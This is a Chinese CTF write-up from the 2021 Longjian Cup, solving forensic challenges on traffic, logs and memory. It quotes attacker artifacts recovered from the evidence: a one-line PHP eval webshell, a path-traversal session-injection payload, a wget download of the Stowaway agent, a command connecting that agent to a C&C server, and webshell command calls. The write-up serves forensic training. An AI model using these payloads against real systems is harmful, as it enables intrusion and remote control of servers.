---
layout: post
title: 2021陇剑杯部分wp
date: 2021-09-19
categories: blog
tags: [wp篇]
description: 文章。



---

## 签到

**1.1此时正在进行的可能是__协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）**

wireshark打开pcapng文件发现http 请求返回包为403

<img src="/img/article/longjiancup/1.png"/>

因此为http

flag: http

## JWT

**2.1该网站使用了__认证方式。（如有字母请全部使用小写）**

上网搜了jwt发现是种认证方式，大胆试了一下

<img src="/img/article/longjiancup/2.png"/>

flag: jwt

**2.2黑客绕过验证使用的jwt中，id和username是__。（中间使用#号隔开，例如1#admin）**

流量包改下后缀成.txt分析发现token可以base64解码，解码可得id和用户名，但有两个为10086#admin和10087#admin试一下答案发现第二个正确

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODcsIk1hcENsYWltcyI6eyJ1c2VybmFtZSI6ImFkbWluIn19.rurQD5RYgMrFZow8r-k7KCP13P32sF-RpTXhKsxzvD0

<img src="/img/article/longjiancup/3.png"/>

flag: 10087#admin

**2.3 黑客获取webshell之后，权限是__？**

一般黑客入侵后想要获得最高权限，超级用户root权限，用wireshark打开流量包往下浏览找，在No.97执行了Form item: "command" = "whoami"，之后98返回包里有root。

<img src="/img/article/longjiancup/5.png"/>

<img src="/img/article/longjiancup/4.png"/>

flag: root

**2.4黑客上传的恶意文件文件名是_____。(请提交带有文件后缀的文件名，例如x.txt)**

返回流量包发现whoami，在97号流量包附近进行重点关注

<img src="/img/article/longjiancup/6.png"/>

接着找包，下面都该是黑客入侵的了，看到了/tmp/1.c先记录一下

<img src="/img/article/longjiancup/7.png"/>

发现黑客move了1.c，1.c正确

<img src="/img/article/longjiancup/8.png"/>

flag: 1.c

**2.5黑客在服务器上编译的恶意so文件，文件名是_。(请提交带有文件后缀的文件名，例如x.so)**

题目问恶意so文件，第一想到的就是在包里搜索相关内容，发现可以找到很多looter.so，于是试提交成功。

<img src="/img/article/longjiancup/9.png"/>

flag: looter

**2.6黑客在服务器上修改了一个配置文件，文件的绝对路径为_____。（请确认绝对路径后再提交）**

command分组详情搜发现cat命令为修改文件指令

<img src="/img/article/longjiancup/10.png"/>

flag: /ect/pam.d/common-auth

## webshell

**3.1黑客登录系统使用的密码是_____。**

http.request后追踪http流 从0试到6后在6又发现了index.php最后在post包里发现

<img src="/img/article/longjiancup/11.png"/>

<img src="/img/article/longjiancup/12.png"/>

flag: Admin123!@#

**3.2黑客修改了一个日志文件，文件的绝对路径为_____。（请确认绝对路径后再提交）**

搜索.log在332包里看到可疑文件`21_08_07.log`，且出现多次，猜测为黑客修改的日志文件

<img src="/img/article/longjiancup/13.png"/>

直接写`data/Runtime/Logs/Home/21_08_07.log`错误

猜测前面应加上`var/www/html/`正确

flag: var/www/html/data/Runtime/Logs/Home/21_08_07.log

**3.3黑客获取webshell之后，权限是__？**

搜索whoami后在第317个包中发现提交了值对aaa=system('whoami')

<img src="/img/article/longjiancup/14.png"/>

追踪http流，将其导出为html,打开发现是phpinfo()，在在user/group中发现值为www-data

<img src="/img/article/longjiancup/15.png"/>

flag: www-data

**3.4黑客写入的webshell文件名是_____。(请提交带有文件后缀的文件名，例如x.txt)**

还是在刚刚的332数据包中追踪http流，发现base64编码,解密后为`<?php eval($_REQUEST[aaa]);?>`，为一句话木马，文件名指向1.php

<img src="/img/article/longjiancup/16.png"/>

flag: 1.php

**3.5黑客上传的代理工具客户端名字是_。（如有字母请全部使用小写）**

在数据包最后面发现了疑似base64没解码出来，但在最后一个包中发现了frpc.ini，其应该是frpc客户端的文件，推测是使用了frpc的代理工具客户端

<img src="/img/article/longjiancup/17.png"/>

<img src="/img/article/longjiancup/18.png"/>

后来发现kye值后面对应的value值去掉前两个字母后解码为`var/www/html/`

搜索key值j68071301598f

找到343数据包，value值去掉前两个字母解码后为`/var/www/html/frpc.ini`

<img src="/img/article/longjiancup/19.png"/>

<img src="/img/article/longjiancup/20.png"/>

flag: frpc

## 日志分析

**4.1网络存在源码泄漏，源码文件名是_____。(请提交带有文件后缀的文件名，例如x.txt)**

分析日志发现，源码文件一般靠前，/www%2ezip HTTP/访问成功url转码得到文件名www.zip

<img src="/img/article/longjiancup/21.png"/>

flag: www.zip

**4.2分析攻击流量，黑客往/tmp目录写入一个文件，文件名为_____。**

搜索tmp发现/tmp下写入了sess_car

<img src="/img/article/longjiancup/22.png"/>

`filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car`进行url解码后为`filename=../../../../../../../../../../../../../../../../../tmp/sess_car`

flag: sess_car

**4.3根据上题，往sess_car中写入了php序列化内容，调用的类为_。**

根据上题，`filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D HTTP/1.1" 302 879 "-" "python-requests/2.26.0"`解码后为`filename=../../../../../../../../../../../../../../../../../tmp/sess_car&content=func|N;files|a:2:{s:8:"filename";s:16:"./files/filename";s:20:"call_user_func_array";s:28:"./files/call_user_func_array";}paths|a:1:{s:5:"/flag";s:13:"SplFileObject";} HTTP/1.1" 302 879 "-" "python-requests/2.26.0"`

其中paths|a:1:{s:5:"/flag";s:13:"SplFileObject";}，调用的类为SplFileObject

flag: SplFileObject

## 内存取证

**6.1虚拟机的密码是_____。（密码中为flag{xxxx}，含有空格，提交时不要去掉）**

PasswareKitForensic工具破解出密码

<img src="/img/article/longjiancup/23.png"/>

flag: flag{W31C0M3 T0 THiS 34SY F0R3NSiCX}

 **6.2虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为_____。（解题过程中需要用到上一题答案中flag{}内的内容进行处理。本题的格式也是flag{xxx}，含有空格，提交时不要去掉）**

Volatility filesscan后发现HUAWEI P40_2021-aa-bb xx.yy.zz.exe，猜测这为华为手机备份文件

dumpfiles命令dump下来

<img src="/img/article/longjiancup/25.png"/>

dump下来后有.img和.dat文件，将.dat后缀改为.zip，解压后得到备份文件HUAWEI P40_2021-aa-bb xx.yy.zz

<img src="/img/article/longjiancup/24.png"/>

网上找到kobackupdec-master工具进行分析，此题需要用到上一题密码改写，尝试了把flag{}去掉，空格换成下划线正确，在生成的文件夹中发现存有flag的图片

```bash
py -3 kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX "E:\volatility\1\file.None\HUAWEI P40_2021-aa-bb xx.yy.zz" E:\volatility\5
```

<img src="/img/article/longjiancup/26.png"/>

flag图片在如下压缩包中

<img src="/img/article/longjiancup/27.png"/>

<img src="/img/article/longjiancup/28.png"/>

flag: {TH4NK Y0U FOR DECRYPTING MY DATA }

## 简单日志分析

**7.1黑客攻击的参数是__。（如有字母请全部使用小写）**

第一个user后面一串解码有whoiam,看出为黑客攻击，参数即为user

<img src="/img/article/longjiancup/29.png"/>

<img src="/img/article/longjiancup/30.png"/>

flag: user

 **7.2黑客查看的秘密文件的绝对路径是_____。**

第二个user后面解码有cat一个文件

<img src="/img/article/longjiancup/31.png"/>

flag: /Th4s_IS_VERY_Import_Fi1e

**7.3黑客反弹shell的ip和端口是_____。（格式使用“ip:端口"，例如127.0.0.1:2333）**

发现base64密文，解码获得flag

<img src="/img/article/longjiancup/32.png"/>

flag: 192.168.2.197:8888

## SQL注入

**8.1黑客在注入过程中采用的注入手法叫_____。（格式为4个汉字，例如“拼搏努力”）**

打开日志文件，发现构造的sql语句为if(...)='..',1,select ....，可知根据requests返回长度判断截取的字符串是否为if后的值，因此是布尔盲注

flag: 布尔盲注

**8.2 黑客在注入过程中，最终获取flag的数据库名、表名和字段名是_____。（格式为“数据库名#表名#字段名”，例如database#table#column）**

文件翻到最后，发现猜测flag的语句为select flag from sqli.flag，因此数据库为sqli，表和字段都为flag（table_schema为数据库名，table_name为表名，select flag中的flag为字段名）

<img src="/img/article/longjiancup/33.png"/>

flag: sqli#flag#flag

**8.3黑客最后获取到的flag字符串为_____。**

找注flag值的语句，取注入每位时的边界值，拼接。

一次拼接比较麻烦

<img src="/img/article/longjiancup/34.png"/>

<img src="/img/article/longjiancup/35.png"/>

用脚本比较快

代码如下

```python
from urllib import parse
num=0
line=0
tmp1=1
tmp2=2
str1=''
 
with open("access.log",'r') as f:
    string=f.readline()
    while(string !=''):
 
 
        if("sqli.flag" in string):
            
            string=parse.unquote(string)
            num=string.find("sqli.flag")#字符
            num+=19
            line=string.find("sqli.flag")
            line+=11
            if(string[line+1] ==","):
                tmp1=int(string[line])
            elif(string[line+1] !=","):
                num+=1
                tmp1=int(string[line:line+2])
 
      
            if(tmp1 ==tmp2): #发现目标字符，是上一行的
                tmp2+=1
                print(str1,end="")
 
        str1=string[num] #保留上一行的字符
        string=f.readline()
```

flag: flag{deddcd67-bcfd-487e-b940-1217e668c7db}

## ios

**10.1黑客所控制的C&C服务器IP是_____.**

根据10.2找到的，在wget处追踪http流，在最下面有转发操作`./ios_agent -c 3.128.156.159:8081 -s hack4sec`

<img src="/img/article/longjiancup/37.png"/>

flag: 3.128.156.159

**10.2黑客利用的Github开源项目的名字是__。（如有字母请全部使用小写）**

用wireshark打开流量包，因为是ios手机联网被黑，搜索GitHub，发现wget` https://github.com/ph4ntonn/Stowaway/releases/download/1.6.2/ios_agent && chmod 755 ios_agent`

<img src="/img/article/longjiancup/36.png"/>

flag: stowaway

**10.3通讯加密密钥的明文是__。**

如上10.1，10.2密钥明文即hack4sec

flag: hack4sec

**10.8黑客写入了一个webshell，其密码为。**

access.log中发现GET //ma.php?fxxk=system(base64_decode(%27d2hvYW1p%27)); php为webshell的其中一个类型，base64解密中间的内容为whoami,其密码猜测为跟在后面的fxxk，提交正确(通过webshell连接密码fxxk执行系统命令whoami)

<img src="/img/article/longjiancup/38.png"/>

